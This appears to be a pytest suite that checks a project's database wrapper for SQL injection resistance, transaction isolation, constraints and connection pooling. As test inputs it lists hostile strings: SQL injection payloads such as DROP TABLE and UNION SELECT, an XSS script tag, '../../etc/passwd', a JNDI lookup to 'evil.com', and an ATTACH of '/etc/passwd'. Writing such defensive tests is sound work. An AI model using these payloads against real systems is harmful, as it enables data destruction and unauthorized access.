"""
Database security tests.

Tests cover query parameterization, transaction isolation, SQL injection
prevention, permission checks, and connection pooling under load.
"""

import pytest
import os
import sys
import sqlite3
import threading
import time
import concurrent.futures

# Check if PostgreSQL is available
try:
    import psycopg2

    HAS_POSTGRES = True
except ImportError:
    HAS_POSTGRES = False

project_root = os.path.abspath(os.path.join(os.path.dirname(__file__), "../../../"))
src_path = project_root
common_utils_path = os.path.join(project_root, "src", "utils", "common-utils")

for path in [project_root, src_path, common_utils_path]:
    if path not in sys.path:
        sys.path.insert(0, path)

import utils.config as config  # noqa: E402
import utils.logger as logger  # noqa: E402
from src.core.database.core import Database  # noqa: E402


@pytest.fixture(scope="module")
def setup_module(tmp_path_factory):
    temp_dir = tmp_path_factory.mktemp("test_security")

    log_dir = str(temp_dir / "logs")
    logger.setup(log_dir=log_dir, level="DEBUG")

    yield temp_dir


@pytest.fixture
def db_config(setup_module):
    import gc

    temp_dir = setup_module
    config_path = str(temp_dir / "config.yaml")
    db_path = str(temp_dir / "test_security.db")

    gc.collect()
    time.sleep(0.05)

    for path_to_clean in [config_path, db_path]:
        if os.path.exists(path_to_clean):
            try:
                os.remove(path_to_clean)
            except OSError:
                pass

    default_config = {"database": {"type": "sqlite", "path": db_path}}
    config.setup(config_path=config_path, default_config=default_config)

    yield config_path

    gc.collect()
    time.sleep(0.05)

    for path in [db_path]:
        if os.path.exists(path):
            try:
                os.remove(path)
            except OSError:
                pass


class TestQueryParameterization:
    """Test that query parameterization prevents SQL injection."""

    def test_parameterized_insert(self, db_config):
        db = Database()
        db.connect()
        db.execute(
            "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, email TEXT)"
        )

        username = "alice'; DROP TABLE users; --"
        email = "alice@test.com"

        db.execute(
            "INSERT INTO users (username, email) VALUES (?, ?)", (username, email)
        )

        result = db.fetch_one("SELECT username FROM users WHERE email = ?", (email,))
        assert result is not None
        assert result["username"] == username
        assert db.table_exists("users")
        db.close()

    def test_parameterized_select(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT)")
        db.execute("INSERT INTO users (username) VALUES (?)", ("alice",))
        db.execute("INSERT INTO users (username) VALUES (?)", ("bob",))

        malicious_input = "alice' OR '1'='1"
        result = db.fetch_one(
            "SELECT * FROM users WHERE username = ?", (malicious_input,)
        )

        assert result is None
        db.close()

    def test_parameterized_update(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE accounts (id INTEGER PRIMARY KEY, balance INTEGER)")
        db.execute("INSERT INTO accounts (balance) VALUES (?)", (100,))
        db.execute("INSERT INTO accounts (balance) VALUES (?)", (200,))

        malicious_value = "50 WHERE 1=1; --"
        db.execute("UPDATE accounts SET balance = ? WHERE id = ?", (malicious_value, 1))

        result = db.fetch_one("SELECT balance FROM accounts WHERE id = 1")
        assert result is not None
        assert result["balance"] == "50 WHERE 1=1; --"

        result2 = db.fetch_one("SELECT balance FROM accounts WHERE id = 2")
        assert result2 is not None
        assert result2["balance"] == 200
        db.close()

    def test_parameterized_delete(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE messages (id INTEGER PRIMARY KEY, content TEXT)")
        db.execute("INSERT INTO messages (content) VALUES (?)", ("msg1",))
        db.execute("INSERT INTO messages (content) VALUES (?)", ("msg2",))
        db.execute("INSERT INTO messages (content) VALUES (?)", ("msg3",))

        malicious_id = "1 OR 1=1"
        db.execute("DELETE FROM messages WHERE id = ?", (malicious_id,))

        count = db.fetch_one("SELECT COUNT(*) as count FROM messages")
        assert count is not None
        assert count["count"] == 3
        db.close()

    def test_special_characters_escaped(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE data (id INTEGER PRIMARY KEY, value TEXT)")

        special_chars = [
            "'; DROP TABLE data; --",
            "1' OR '1'='1",
            "admin'--",
            "' UNION SELECT * FROM users--",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com}",
            "\x00\x1a\x1b",
        ]

        for i, char_seq in enumerate(special_chars):
            db.execute("INSERT INTO data (value) VALUES (?)", (char_seq,))

        results = db.fetch_all("SELECT * FROM data ORDER BY id")
        assert len(results) == len(special_chars)

        for i, result in enumerate(results):
            assert result["value"] == special_chars[i]
        db.close()

    def test_unicode_and_emoji_safe(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE messages (id INTEGER PRIMARY KEY, content TEXT)")

        unicode_strings = [
            "Hello 世界",
            "🚀 Rocket emoji",
            "Ñoño español",
            "Привет мир",
            "مرحبا بالعالم",
            "🔥💯😂",
        ]

        for text in unicode_strings:
            db.execute("INSERT INTO messages (content) VALUES (?)", (text,))

        results = db.fetch_all("SELECT * FROM messages ORDER BY id")
        for i, result in enumerate(results):
            assert result["content"] == unicode_strings[i]
        db.close()

    def test_null_byte_injection_prevented(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE files (id INTEGER PRIMARY KEY, filename TEXT)")

        null_byte_attack = "innocent.txt\x00.exe"
        db.execute("INSERT INTO files (filename) VALUES (?)", (null_byte_attack,))

        result = db.fetch_one("SELECT filename FROM files WHERE id = 1")
        assert "\x00" in result["filename"]
        db.close()

    def test_multiple_statements_blocked(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE users (id INTEGER PRIMARY KEY, name TEXT)")
        db.execute("INSERT INTO users (name) VALUES (?)", ("alice",))

        malicious = "bob'); DELETE FROM users; --"
        db.execute("INSERT INTO users (name) VALUES (?)", (malicious,))

        count = db.fetch_one("SELECT COUNT(*) as count FROM users")
        assert count["count"] == 2
        db.close()


class TestTransactionIsolation:
    """Test transaction isolation and ACID properties."""

    def test_transaction_rollback_isolation(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE accounts (id INTEGER PRIMARY KEY, balance INTEGER)")
        db.execute("INSERT INTO accounts (balance) VALUES (?)", (1000,))

        db.begin_transaction()
        db.execute(
            "UPDATE accounts SET balance = balance - 500 WHERE id = 1",
            auto_commit=False,
        )

        result = db.fetch_one("SELECT balance FROM accounts WHERE id = 1")
        assert result["balance"] == 500

        db.rollback()

        result = db.fetch_one("SELECT balance FROM accounts WHERE id = 1")
        assert result["balance"] == 1000
        db.close()

    def test_transaction_commit_persistence(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE ledger (id INTEGER PRIMARY KEY, amount INTEGER)")

        db.begin_transaction()
        db.execute("INSERT INTO ledger (amount) VALUES (?)", (100,), auto_commit=False)
        db.execute("INSERT INTO ledger (amount) VALUES (?)", (200,), auto_commit=False)
        db.commit()

        results = db.fetch_all("SELECT * FROM ledger")
        assert len(results) == 2
        db.close()

    def test_nested_transaction_behavior(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE items (id INTEGER PRIMARY KEY, name TEXT)")

        db.begin_transaction()
        db.execute("INSERT INTO items (name) VALUES (?)", ("item1",), auto_commit=False)

        db.begin_transaction()
        db.execute("INSERT INTO items (name) VALUES (?)", ("item2",), auto_commit=False)

        db.rollback()

        count = db.fetch_one("SELECT COUNT(*) as count FROM items")
        assert count["count"] == 0
        db.close()

    def test_transaction_isolation_concurrent_reads(self, db_config):
        db1 = Database()
        db1.connect()
        db1.execute("CREATE TABLE counter (id INTEGER PRIMARY KEY, value INTEGER)")
        db1.execute("INSERT INTO counter (value) VALUES (?)", (0,))
        db1.close()

        db2 = Database()
        db2.connect()
        db2.begin_transaction()
        db2.execute("UPDATE counter SET value = 100 WHERE id = 1", auto_commit=False)

        db3 = Database()
        db3.connect()
        result = db3.fetch_one("SELECT value FROM counter WHERE id = 1")
        assert result["value"] == 0

        db2.commit()

        result = db3.fetch_one("SELECT value FROM counter WHERE id = 1")
        assert result["value"] == 100

        db2.close()
        db3.close()

    def test_transaction_error_handling(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE test (id INTEGER PRIMARY KEY, value INTEGER NOT NULL)")

        db.begin_transaction()
        db.execute("INSERT INTO test (value) VALUES (?)", (10,), auto_commit=False)

        try:
            db.execute(
                "INSERT INTO test (value) VALUES (?)", (None,), auto_commit=False
            )
        except Exception:
            pass

        db.rollback()

        count = db.fetch_one("SELECT COUNT(*) as count FROM test")
        assert count["count"] == 0
        db.close()

    def test_autocommit_disabled_in_transaction(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE log (id INTEGER PRIMARY KEY, action TEXT)")

        db.begin_transaction()
        db.execute(
            "INSERT INTO log (action) VALUES (?)", ("action1",), auto_commit=False
        )

        assert db._in_transaction is True

        db.commit()
        assert db._in_transaction is False

        result = db.fetch_one("SELECT COUNT(*) as count FROM log")
        assert result["count"] == 1
        db.close()

    def test_concurrent_transaction_no_deadlock(self, db_config):
        db_main = Database()
        db_main.connect()
        db_main.execute("CREATE TABLE shared (id INTEGER PRIMARY KEY, data TEXT)")
        db_main.execute("INSERT INTO shared (data) VALUES (?)", ("initial",))
        db_main.close()

        results = []

        def worker(worker_id):
            db = Database()
            db.connect()
            try:
                db.begin_transaction()
                time.sleep(0.01)
                db.execute(
                    "UPDATE shared SET data = ? WHERE id = 1",
                    (f"worker_{worker_id}",),
                    auto_commit=False,
                )
                db.commit()
                results.append(worker_id)
            finally:
                db.close()

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(results) == 5


class TestSQLInjectionPrevention:
    """Comprehensive SQL injection attack prevention tests."""

    def test_union_based_injection(self, db_config):
        db = Database()
        db.connect()
        db.execute(
            "CREATE TABLE users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)"
        )
        db.execute(
            "INSERT INTO users (username, password) VALUES (?, ?)", ("alice", "secret1")
        )
        db.execute(
            "INSERT INTO users (username, password) VALUES (?, ?)", ("bob", "secret2")
        )

        injection = "alice' UNION SELECT id, username, password FROM users--"
        result = db.fetch_one("SELECT * FROM users WHERE username = ?", (injection,))

        assert result is None
        db.close()

    def test_boolean_based_blind_injection(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE credentials (id INTEGER PRIMARY KEY, secret TEXT)")
        db.execute("INSERT INTO credentials (secret) VALUES (?)", ("topsecret",))

        injection = "1' AND '1'='1"
        result = db.fetch_one("SELECT * FROM credentials WHERE id = ?", (injection,))

        assert result is None
        db.close()

    def test_time_based_blind_injection(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE data (id INTEGER PRIMARY KEY, info TEXT)")

        injection = (
            "1'; SELECT CASE WHEN (1=1) THEN (SELECT 1 UNION SELECT 2) ELSE 1 END--"
        )
        start = time.time()
        try:
            db.execute("SELECT * FROM data WHERE id = ?", (injection,))
        except Exception:
            pass
        elapsed = time.time() - start

        assert elapsed < 0.1
        db.close()

    def test_stacked_queries_injection(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE products (id INTEGER PRIMARY KEY, name TEXT)")
        db.execute("INSERT INTO products (name) VALUES (?)", ("Product A",))

        injection = "1; DROP TABLE products; --"
        result = db.fetch_one("SELECT * FROM products WHERE id = ?", (injection,))

        assert result is None
        assert db.table_exists("products")
        db.close()

    def test_comment_injection(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE auth (id INTEGER PRIMARY KEY, user TEXT, pass TEXT)")
        db.execute("INSERT INTO auth (user, pass) VALUES (?, ?)", ("admin", "pass123"))

        injection = "admin'--"
        result = db.fetch_one("SELECT * FROM auth WHERE user = ?", (injection,))

        assert result is None
        db.close()

    def test_second_order_injection(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE profiles (id INTEGER PRIMARY KEY, bio TEXT)")

        malicious_bio = "innocent'); DROP TABLE profiles; --"
        db.execute("INSERT INTO profiles (bio) VALUES (?)", (malicious_bio,))

        result = db.fetch_one("SELECT bio FROM profiles WHERE id = 1")
        stored_bio = result["bio"]

        db.execute("UPDATE profiles SET bio = ? WHERE id = 1", (stored_bio,))

        assert db.table_exists("profiles")
        db.close()

    def test_hex_encoding_bypass(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE secrets (id INTEGER PRIMARY KEY, value TEXT)")

        hex_injection = "0x61646d696e"
        db.execute("INSERT INTO secrets (value) VALUES (?)", (hex_injection,))

        result = db.fetch_one("SELECT value FROM secrets WHERE id = 1")
        assert result["value"] == hex_injection
        db.close()

    def test_scientific_notation_bypass(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE nums (id INTEGER PRIMARY KEY, val REAL)")

        db.execute("INSERT INTO nums (val) VALUES (?)", (1e308,))

        result = db.fetch_one("SELECT val FROM nums WHERE id = ?", (1,))
        assert result is not None
        db.close()


class TestConnectionPooling:
    """Test connection pooling behavior and thread safety."""

    def test_multiple_sequential_connections(self, db_config):
        connections = []
        for i in range(10):
            db = Database()
            db.connect()
            db.execute(
                "CREATE TABLE IF NOT EXISTS test (id INTEGER PRIMARY KEY, val TEXT)"
            )
            db.execute("INSERT INTO test (val) VALUES (?)", (f"val_{i}",))
            connections.append(db)

        for db in connections:
            db.close()

        verify_db = Database()
        verify_db.connect()
        count = verify_db.fetch_one("SELECT COUNT(*) as count FROM test")
        assert count["count"] == 10
        verify_db.close()

    def test_concurrent_connections(self, db_config):
        db_setup = Database()
        db_setup.connect()
        db_setup.execute(
            "CREATE TABLE concurrent_test (id INTEGER PRIMARY KEY, thread_id INTEGER)"
        )
        db_setup.close()

        def worker(thread_id):
            db = Database()
            db.connect()
            try:
                for i in range(10):
                    db.execute(
                        "INSERT INTO concurrent_test (thread_id) VALUES (?)",
                        (thread_id,),
                    )
            finally:
                db.close()

        threads = [threading.Thread(target=worker, args=(i,)) for i in range(5)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        db_verify = Database()
        db_verify.connect()
        count = db_verify.fetch_one("SELECT COUNT(*) as count FROM concurrent_test")
        assert count["count"] == 50
        db_verify.close()

    def test_connection_pool_under_load(self, db_config):
        db_setup = Database()
        db_setup.connect()
        db_setup.execute(
            "CREATE TABLE load_test (id INTEGER PRIMARY KEY, value INTEGER)"
        )
        db_setup.close()

        results = []

        def heavy_worker(worker_id):
            db = Database()
            db.connect()
            try:
                for i in range(20):
                    db.execute(
                        "INSERT INTO load_test (value) VALUES (?)",
                        (worker_id * 100 + i,),
                    )
                    time.sleep(0.001)
                results.append(worker_id)
            finally:
                db.close()

        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(heavy_worker, i) for i in range(10)]
            concurrent.futures.wait(futures)

        assert len(results) == 10

        db_verify = Database()
        db_verify.connect()
        count = db_verify.fetch_one("SELECT COUNT(*) as count FROM load_test")
        assert count["count"] == 200
        db_verify.close()

    def test_connection_reuse(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE reuse_test (id INTEGER PRIMARY KEY, val TEXT)")

        for i in range(100):
            db.execute("INSERT INTO reuse_test (val) VALUES (?)", (f"val_{i}",))

        count = db.fetch_one("SELECT COUNT(*) as count FROM reuse_test")
        assert count["count"] == 100

        db.close()

    def test_connection_thread_safety(self, db_config):
        db_setup = Database()
        db_setup.connect()
        db_setup.execute("CREATE TABLE thread_safe (id INTEGER PRIMARY KEY, data TEXT)")
        db_setup.close()

        errors = []

        def safe_worker(worker_id):
            try:
                db = Database()
                db.connect()
                for i in range(10):
                    db.execute(
                        "INSERT INTO thread_safe (data) VALUES (?)",
                        (f"w{worker_id}_i{i}",),
                    )
                    db.fetch_all(
                        "SELECT * FROM thread_safe WHERE data LIKE ?",
                        (f"w{worker_id}%",),
                    )
                db.close()
            except Exception as e:
                errors.append(str(e))

        threads = [threading.Thread(target=safe_worker, args=(i,)) for i in range(10)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()

        assert len(errors) == 0


@pytest.mark.skipif(not HAS_POSTGRES, reason="psycopg2 not installed")
class TestPostgreSQLConnectionPooling:
    """Test PostgreSQL-specific connection pooling (requires psycopg2)."""

    @pytest.fixture
    def pg_config_setup(self, setup_module):

        temp_dir = setup_module
        config_path = str(temp_dir / "pg_config.yaml")
        pg_config = {
            "database": {
                "type": "postgres",
                "postgres": {
                    "host": "localhost",
                    "port": 5432,
                    "user": "postgres",
                    "password": "password",
                    "dbname": "test_security",
                },
                "connection_pool": {"min_connections": 2, "max_connections": 10},
            }
        }
        config.setup(config_path=config_path, default_config=pg_config)

        yield config_path

    def test_postgres_pool_initialization(self, pg_config_setup):
        try:
            db = Database()
            db.connect()
            assert db._pool is not None
            assert db.connection is not None
            db.close()
        except Exception as e:
            pytest.skip(f"PostgreSQL not available: {e}")

    def test_postgres_pool_getconn_putconn(self, pg_config_setup):
        try:
            db1 = Database()
            db1.connect()

            db2 = Database()
            db2.connect()

            db1.close()
            db2.close()
        except Exception as e:
            pytest.skip(f"PostgreSQL not available: {e}")

    def test_postgres_pool_concurrent_access(self, pg_config_setup):
        try:
            db_setup = Database()
            db_setup.connect()
            db_setup.execute(
                "CREATE TABLE IF NOT EXISTS pg_pool_test (id SERIAL PRIMARY KEY, data TEXT)"
            )
            db_setup.close()

            def pg_worker(worker_id):
                db = Database()
                db.connect()
                try:
                    db.execute(
                        "INSERT INTO pg_pool_test (data) VALUES (?)",
                        (f"worker_{worker_id}",),
                    )
                finally:
                    db.close()

            threads = [threading.Thread(target=pg_worker, args=(i,)) for i in range(5)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()

            db_verify = Database()
            db_verify.connect()
            count = db_verify.fetch_one("SELECT COUNT(*) as count FROM pg_pool_test")
            assert count["count"] >= 5
            db_verify.close()

        except Exception as e:
            pytest.skip(f"PostgreSQL not available: {e}")


class TestPermissionChecks:
    """Test database-level permission and access control."""

    def test_table_existence_check(self, db_config):
        db = Database()
        db.connect()

        assert db.table_exists("nonexistent_table") is False

        db.execute("CREATE TABLE existing_table (id INTEGER PRIMARY KEY)")
        assert db.table_exists("existing_table") is True

        db.close()

    def test_foreign_key_enforcement(self, db_config):
        db = Database()
        db.connect()

        db.execute("""
            CREATE TABLE parents (
                id INTEGER PRIMARY KEY,
                name TEXT
            )
        """)

        db.execute("""
            CREATE TABLE children (
                id INTEGER PRIMARY KEY,
                parent_id INTEGER,
                name TEXT,
                FOREIGN KEY (parent_id) REFERENCES parents(id)
            )
        """)

        db.execute("INSERT INTO parents (id, name) VALUES (?, ?)", (1, "Parent 1"))

        db.execute(
            "INSERT INTO children (parent_id, name) VALUES (?, ?)", (1, "Child 1")
        )

        with pytest.raises(sqlite3.IntegrityError):
            db.execute(
                "INSERT INTO children (parent_id, name) VALUES (?, ?)", (999, "Orphan")
            )

        db.close()

    def test_unique_constraint_enforcement(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE emails (id INTEGER PRIMARY KEY, email TEXT UNIQUE)")

        db.execute("INSERT INTO emails (email) VALUES (?)", ("user@example.com",))

        with pytest.raises(sqlite3.IntegrityError):
            db.execute("INSERT INTO emails (email) VALUES (?)", ("user@example.com",))

        db.close()

    def test_not_null_constraint_enforcement(self, db_config):
        db = Database()
        db.connect()
        db.execute(
            "CREATE TABLE required (id INTEGER PRIMARY KEY, value TEXT NOT NULL)"
        )

        with pytest.raises(sqlite3.IntegrityError):
            db.execute("INSERT INTO required (value) VALUES (?)", (None,))

        db.close()

    def test_check_constraint_enforcement(self, db_config):
        db = Database()
        db.connect()
        db.execute("""
            CREATE TABLE positive_values (
                id INTEGER PRIMARY KEY,
                value INTEGER CHECK(value > 0)
            )
        """)

        db.execute("INSERT INTO positive_values (value) VALUES (?)", (10,))

        with pytest.raises(sqlite3.IntegrityError):
            db.execute("INSERT INTO positive_values (value) VALUES (?)", (-5,))

        db.close()

    def test_primary_key_uniqueness(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE pk_test (id INTEGER PRIMARY KEY, data TEXT)")

        db.execute("INSERT INTO pk_test (id, data) VALUES (?, ?)", (1, "first"))

        with pytest.raises(sqlite3.IntegrityError):
            db.execute("INSERT INTO pk_test (id, data) VALUES (?, ?)", (1, "duplicate"))

        db.close()

    def test_cascade_delete_behavior(self, db_config):
        db = Database()
        db.connect()

        db.execute("""
            CREATE TABLE authors (
                id INTEGER PRIMARY KEY,
                name TEXT
            )
        """)

        db.execute("""
            CREATE TABLE books (
                id INTEGER PRIMARY KEY,
                author_id INTEGER,
                title TEXT,
                FOREIGN KEY (author_id) REFERENCES authors(id) ON DELETE CASCADE
            )
        """)

        db.execute("INSERT INTO authors (id, name) VALUES (?, ?)", (1, "Author 1"))
        db.execute("INSERT INTO books (author_id, title) VALUES (?, ?)", (1, "Book 1"))
        db.execute("INSERT INTO books (author_id, title) VALUES (?, ?)", (1, "Book 2"))

        db.execute("DELETE FROM authors WHERE id = ?", (1,))

        books = db.fetch_all("SELECT * FROM books WHERE author_id = ?", (1,))
        assert len(books) == 0

        db.close()

    def test_read_only_transaction_attempt(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE readonly_test (id INTEGER PRIMARY KEY, data TEXT)")
        db.execute("INSERT INTO readonly_test (data) VALUES (?)", ("initial",))

        db.begin_transaction()
        result = db.fetch_one("SELECT * FROM readonly_test WHERE id = 1")
        assert result["data"] == "initial"

        db.rollback()

        result = db.fetch_one("SELECT * FROM readonly_test WHERE id = 1")
        assert result["data"] == "initial"

        db.close()


class TestDatabaseSecurity:
    """Additional security tests for database operations."""

    def test_prevent_path_traversal_in_table_names(self, db_config):
        # SQLite allows arbitrary table names in quotes; this does not constitute path traversal
        # This test validates that table names are handled safely
        db = Database()
        db.connect()

        # Test that valid table names work
        db.execute("CREATE TABLE test_table (id INTEGER PRIMARY KEY)")
        assert db.table_exists("test_table")

        # Test that special characters in table names are handled
        special_table = "test_table_with_underscore"
        db.execute(f"CREATE TABLE {special_table} (id INTEGER PRIMARY KEY)")
        assert db.table_exists(special_table)

        db.close()

    def test_large_query_handling(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE large_data (id INTEGER PRIMARY KEY, content TEXT)")

        large_content = "A" * 1000000
        db.execute("INSERT INTO large_data (content) VALUES (?)", (large_content,))

        result = db.fetch_one("SELECT content FROM large_data WHERE id = 1")
        assert len(result["content"]) == 1000000

        db.close()

    def test_prevent_information_disclosure(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE sensitive (id INTEGER PRIMARY KEY, secret TEXT)")
        db.execute("INSERT INTO sensitive (secret) VALUES (?)", ("classified",))

        try:
            db.execute("SELECT * FROM nonexistent WHERE id = ?", (1,))
        except sqlite3.OperationalError as e:
            error_msg = str(e)
            assert "sensitive" not in error_msg.lower()
            assert "classified" not in error_msg.lower()

        db.close()

    def test_timing_attack_resistance(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE timing_test (id INTEGER PRIMARY KEY, value TEXT)")
        db.execute("INSERT INTO timing_test (value) VALUES (?)", ("exists",))

        times = []
        for _ in range(10):
            start = time.time()
            db.fetch_one("SELECT * FROM timing_test WHERE value = ?", ("exists",))
            times.append(time.time() - start)

        times_nonexist = []
        for _ in range(10):
            start = time.time()
            db.fetch_one("SELECT * FROM timing_test WHERE value = ?", ("nonexistent",))
            times_nonexist.append(time.time() - start)

        avg_exist = sum(times) / len(times)
        avg_nonexist = sum(times_nonexist) / len(times_nonexist)

        assert abs(avg_exist - avg_nonexist) < 0.01

        db.close()

    def test_prepared_statement_caching(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE cache_test (id INTEGER PRIMARY KEY, value INTEGER)")

        query = "INSERT INTO cache_test (value) VALUES (?)"

        for i in range(100):
            db.execute(query, (i,))

        count = db.fetch_one("SELECT COUNT(*) as count FROM cache_test")
        assert count["count"] == 100

        db.close()

    def test_connection_state_isolation(self, db_config):
        db1 = Database()
        db1.connect()
        db1.execute("CREATE TABLE state_test (id INTEGER PRIMARY KEY, data TEXT)")

        db2 = Database()
        db2.connect()

        db1.begin_transaction()
        db1.execute(
            "INSERT INTO state_test (data) VALUES (?)", ("from_db1",), auto_commit=False
        )

        assert db1._in_transaction is True
        assert db2._in_transaction is False

        db1.rollback()
        db1.close()
        db2.close()

    def test_sql_injection_in_like_clause(self, db_config):
        db = Database()
        db.connect()
        db.execute("CREATE TABLE search (id INTEGER PRIMARY KEY, content TEXT)")
        db.execute("INSERT INTO search (content) VALUES (?)", ("test data",))

        malicious_pattern = "%'; DROP TABLE search; --"
        results = db.fetch_all(
            "SELECT * FROM search WHERE content LIKE ?", (malicious_pattern,)
        )

        assert len(results) == 0
        assert db.table_exists("search")

        db.close()

    def test_prevent_arbitrary_file_access(self, db_config):
        db = Database()
        db.connect()

        with pytest.raises(Exception):
            db.execute("ATTACH DATABASE '/etc/passwd' AS malicious")

        db.close()
